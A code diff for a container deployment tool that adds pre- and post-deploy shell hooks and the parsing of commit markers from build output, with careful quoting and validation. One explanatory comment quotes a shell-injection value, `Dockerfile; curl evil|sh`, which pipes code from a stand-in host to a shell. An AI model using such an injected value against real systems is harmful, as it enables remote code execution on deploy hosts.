@@ -79,6 +79,12 @@ export interface AppSpec {
   buildArgs?: Record<string, string>;
   /** Raw extra flags appended to `docker run` (advanced; passed through verbatim). */
   dockerOptions?: string | null;
+  /** Shell command run in a one-shot container of the NEW image before the swap (e.g. DB migrations).
+   *  A non-zero exit aborts the deploy with the old container still serving. null/empty → no hook. */
+  preDeployCommand?: string | null;
+  /** Shell command run inside the LIVE container after the health gate passes. Best-effort: a failure is
+   *  logged but never rolls back (the new version is already serving). null/empty → no hook. */
+  postDeployCommand?: string | null;
   /** When set, the built image is tagged + pushed to this registry after building. */
   registryPush?: { auth: RegistryAuth; tag: string } | null;
   /** When set, the local tag is produced by PULLING this registry ref (built elsewhere),
@@ -208,6 +214,34 @@ export function imageRef(app: AppSpec): string {
 export function parseImageDigest(output: string): string | null {
   const m = /TUGRA_DIGEST=(\S+)/.exec(output);
   return m ? m[1] : null;
+}
+
+/**
+ * Extract the deployed git commit from a GIT deploy's output. prepSteps echoes, right after the clone
+ * and BEFORE any user build output, `TUGRA_COMMIT=<40/64-hex>` and `TUGRA_COMMIT_MSG_B64=<base64 subject>`
+ * (both unconditionally, so the real marker always precedes user output and the first anchored match wins).
+ * The sha is hex-validated so arbitrary build/user output (which could print a fake `TUGRA_COMMIT=`) can't
+ * poison provenance. The subject is attacker-influenceable text (public repos), so it is base64-transported,
+ * then decoded, stripped of control chars, and capped. CALLERS must gate on source === "GIT" — for an
+ * IMAGE/COMPOSE app no real marker is emitted, so a hook/build line could otherwise forge one. Returns
+ * null when the marker is absent or the sha is not valid hex. (40 hex = sha1, 64 = sha256 repos.)
+ */
+export function parseCommit(output: string): { sha: string; message: string | null } | null {
+  const shaM = /^TUGRA_COMMIT=([0-9a-f]{7,64})\s*$/m.exec(output);
+  if (!shaM) return null;
+  const msgM = /^TUGRA_COMMIT_MSG_B64=([A-Za-z0-9+/=]*)\s*$/m.exec(output);
+  let message: string | null = null;
+  if (msgM && msgM[1]) {
+    try {
+      const decoded = Buffer.from(msgM[1], "base64").toString("utf8");
+      // First line only, strip control chars (incl. ANSI escapes), cap length — pure data, never shell/HTML.
+      const clean = decoded.split("\n")[0].replace(/[\u0000-\u001f\u007f]/g, "").trim();
+      message = clean ? clean.slice(0, 200) : null;
+    } catch {
+      message = null;
+    }
+  }
+  return { sha: shaM[1], message };
 }
 
 /** The registry reference the built image is pushed to:
@@ -521,6 +555,16 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
     } else {
       steps.push(`git clone --depth 1 --branch ${shq(branch)} -- ${shq(url)} ${bd}`);
     }
+    // Record the deployed commit right after the clone and BEFORE any build output — build/user output is
+    // noisy (could push a late marker past the agent's 64KB head-capped buffer) and could print a fake
+    // `TUGRA_COMMIT=` line (parseCommit takes the first anchored, hex-validated match, so earliest wins).
+    // All best-effort + set-e-safe via `|| true`; the subject is base64-transported (never raw on a marker).
+    steps.push(
+      `TUGRA_C=$(git -C ${bd} rev-parse HEAD 2>/dev/null || true)`,
+      `echo "TUGRA_COMMIT=$TUGRA_C"`,
+      `TUGRA_CM=$(git -C ${bd} log -1 --format=%s 2>/dev/null | head -c 300 | base64 | tr -d '\\n' || true)`,
+      `echo "TUGRA_COMMIT_MSG_B64=$TUGRA_CM"`,
+    );
     if (app.buildType === "DOCKERFILE") {
       // shq the -f path: dockerfilePath is caller/importer-supplied; unquoted it was a host-root shell
       // injection (e.g. `Dockerfile; curl evil|sh`). The `--` before each clone URL likewise stops a
@@ -734,6 +778,51 @@ function runContainerArgs(app: AppSpec, version: string, name: string): string {
     : run;
 }
 
+/** Container flags for a one-shot PRE-deploy run: the app's env file (so DATABASE_URL etc. are present),
+ *  the managed-DB network when the app is DB-linked (so a migration can reach the DB), and the same
+ *  named/host volumes. Deliberately NOT the --name/-p/labels/--restart/health/dockerOptions of the live
+ *  container — the hook is a throwaway job, not a second copy of the app in rotation. */
+function preDeployContainerArgs(app: AppSpec): string {
+  const env = app.env && typeof app.env === "object" ? app.env : {};
+  const envArg = Object.keys(env).length > 0 ? `--env-file ${envFilePath(app)}` : "";
+  const net = app.dbNetwork ? `--network ${DB_NET}` : "";
+  const volArgs = (app.volumes ?? []).map((v) => `-v ${appVolumeName(app, v.name)}:${v.path}`).join(" ");
+  const hostMountArgs = (app.hostMounts ?? [])
+    .map((m) => `-v ${shq(`${m.hostPath}:${m.containerPath}${m.readOnly ? ":ro" : ""}`)}`)
+    .join(" ");
+  return [envArg, net, volArgs, hostMountArgs].filter(Boolean).join(" ");
+}
+
+/** PRE-deploy hook: run the user command in a one-shot container of the NEW image, BEFORE the swap. Returns
+ *  [] when unset so default scripts stay byte-identical. The command runs via `sh -c <shq>` (single-quoted,
+ *  so arbitrary multi-line shell is literal — no injection into the deploy `sh -c`). A non-zero exit (hook
+ *  failure OR the daemon refusing the run) is normalized to `exit 1` — never 3 (the auto-rollback code) — so
+ *  the deploy aborts with the old container still serving. Must be placed under `set -e`, after the env/DB
+ *  prelude and BEFORE the first destructive step. */
+function preDeploySteps(app: AppSpec, version: string): string[] {
+  const cmd = app.preDeployCommand?.trim();
+  if (!cmd) return [];
+  const args = preDeployContainerArgs(app);
+  const ref = runTag(app, version);
+  return [
+    `echo "TUGRA_PREDEPLOY: running"`,
+    `if docker run --rm ${args ? args + " " : ""}--entrypoint sh ${shq(ref)} -c ${shq(cmd)}; then echo "TUGRA_PREDEPLOY: ok"; else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi`,
+  ];
+}
+
+/** POST-deploy hook, issued as a SEPARATE command AFTER a confirmed-successful classic deploy (so the
+ *  delicate health-gate exit paths are left untouched): run the user command INSIDE the now-live container.
+ *  Best-effort — the new version is already serving, so a failure is logged via the marker but never rolls
+ *  back. The `&& … || …` form always exits 0, so it is safe under either `set -e` or `set +e`. */
+export function buildPostDeployScript(app: AppSpec): string {
+  const cmd = app.postDeployCommand?.trim() ?? "";
+  const name = containerName(app);
+  return [
+    `echo "TUGRA_POSTDEPLOY: running"`,
+    `docker exec ${name} sh -c ${shq(cmd)} && echo "TUGRA_POSTDEPLOY: ok" || echo "TUGRA_POSTDEPLOY: failed (ignored)"`,
+  ].join("\n");
+}
+
 /**
  * Hard-cutover deploy: `docker rm -f` the old container, then run the new one under
  * the same stable name. Brief downtime during the swap. Used for non-rolling apps
@@ -746,6 +835,7 @@ export function buildRunScript(app: AppSpec, version: string, build = true, noCa
     ...(build ? prepSteps(app, version, noCache) : []),
     ...envPreludeFor(app),
     ...dbNetPreludeFor(app),
+    ...(build ? preDeploySteps(app, version) : []),
     `docker rm -f ${name} 2>/dev/null || true`,
     runContainerArgs(app, version, name),
     `docker ps --filter name=${name} --format '{{.Status}}'`,
@@ -869,6 +959,7 @@ export function buildRollingDeployScript(
     ...(build ? prepSteps(app, version, opts.noCache ?? false) : []),
     ...envPreludeFor(app),
     ...dbNetPreludeFor(app),
+    ...(build ? preDeploySteps(app, version) : []),
     `docker rm -f ${rollout} 2>/dev/null || true`, // clear any stale rollout
     runContainerArgs(rApp, version, rollout),
     "set +e", // the health gate must not abort the script on a failed probe
@@ -916,6 +1007,7 @@ export function buildRecreateDeployScript(
     ...(build ? prepSteps(app, version, opts.noCache ?? false) : []),
     ...envPreludeFor(app),
     ...dbNetPreludeFor(app),
+    ...(build ? preDeploySteps(app, version) : []),
     `docker rm -f ${canonical} 2>/dev/null || true`, // stop old (brief downtime begins)
     "set +e", // from here a start/health failure must reach the rollback branch, not abort
     // Guard the start itself: a `docker run` rejected by the daemon (port clash, bad mount,
